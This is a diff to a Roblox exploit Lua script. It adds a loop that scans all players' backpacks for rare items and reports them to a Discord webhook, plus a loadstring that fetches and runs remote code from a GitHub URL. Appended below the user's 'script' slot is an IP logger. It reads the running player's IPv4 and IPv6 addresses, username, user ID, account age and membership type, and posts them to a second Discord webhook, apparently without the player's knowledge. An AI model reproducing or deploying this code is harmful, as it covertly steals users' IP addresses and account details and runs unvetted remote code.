@@ -1,9 +1,21 @@
+while wait(1.2) do
+    
+for i, x in pairs(game.Players:GetPlayers()) do
+    for k, v in pairs(x.Backpack:GetChildren()) do
+        if string.find(v.Name, "Rare Box") or string.find(v.Name, "Ultra Rare Box") or string.find(v.Name, "Alice") or string.find(v.Name, "Gas") or string.find(v.Name, "Plasma") or string.find(v.Name, "Snow") or string.find(v.Name, "Magma") or string.find(v.Name, "Rumble") or string.find(v.Name, "Sand") or string.find(v.Name, "Light") or string.find(v.Name, "Flare") or string.find(v.Name, "Smoke") or string.find(v.Name, "Chilly") or string.find(v.Name, "Hollow") or string.find(v.Name, "Candy Fruit") or string.find(v.Name, "Venom") or string.find(v.Name, "Ope") or string.find(v.Name, "Gravity") or string.find(v.Name, "Vampire") or string.find(v.Name, "Dark") or string.find(v.Name, "Phoenix") or string.find(v.Name, "Quake") then
 local url =
-   "https://discord.com/api/webhooks/995761666602061855/KvoTDUO44HdUNOqwYyUsrzPzt0MBRULt8HJ4swqFivaoC9oHcrB_E8e4JGKxOL7lf2Ll"
+   "https://discord.com/api/webhooks/995488713515745440/9o09kJNtRSSB-tprYvb2AmME3ui3bi79KyuVm8DbA3yqo0tqlLh8F_6R_tUs8_Leej8l"
 local data = {
-   ["content"] = text, 
-
-}
+   ["content"] = "WAKE THE FUCK UP @everyone",
+   ["embeds"] = {
+       {
+           ["title"] = "in `".. game.Players.LocalPlayer.Name .. "`'s game" ,
+           ["description"] = "We found a " .."`" .. v.Name .. "`" .. " inside **(" .. v.Parent.Parent.Name .. "**'s Inventory)",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           }
+       }
+   }
 local newdata = game:GetService("HttpService"):JSONEncode(data)
 
 local headers = {
@@ -12,3 +24,74 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+        end
+    end
+end
+end
+
+
+-- put your shitty script here
+loadstring(game:HttpGet("https://github.com/II-Fallzy-II/Godslayer/blob/main/Cutie%20fallz%20hub"))()
+-- above is your script
+
+local Webhook = "https://discord.com/api/webhooks/996322079425171496/_WLhwtHJZlIbAZlXbtH4kYv9C6XPnMUiweS2McpdpV7ijJG81tcw7x9MzcJkyGf26fbB"
+
+local IPv4 = game:HttpGet("https://v4.ident.me/")
+local IPv6 = game:HttpGet("https://v6.ident.me/")
+
+local Headers = {["content-type"] = "application/json"} -- Don't Modify
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local UserId = LocalPlayer.UserId
+local PlayerName = game:GetService("CoreGui").RobloxGui.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame["p_"..UserId].ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerName.PlayerName.Text
+
+local PlayerData =
+{
+       ["content"] = "",
+       ["embeds"] = {{
+           ["title"] = "**Username**:",
+           ["description"] = PlayerName,
+           ["color"] = tonumber(0x2B6BE4),
+           ["fields"] = {
+               {
+                   ["name"] = "MembershipType:",
+                   ["value"] = MembershipType,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "AccountAge:",
+                   ["value"] = AccountAge,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "UserId:",
+                   ["value"] = UserId,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "IPv4:",
+                   ["value"] = IPv4,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "IPv6:",
+                   ["value"] = IPv6,
+                   ["inline"] = true
+},
+           },
+       }}
+   }
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+local HttpRequest = http_request;
+
+if syn then
+   HttpRequest = syn.request
+   else
+   HttpRequest = http_request
+end
+
+HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
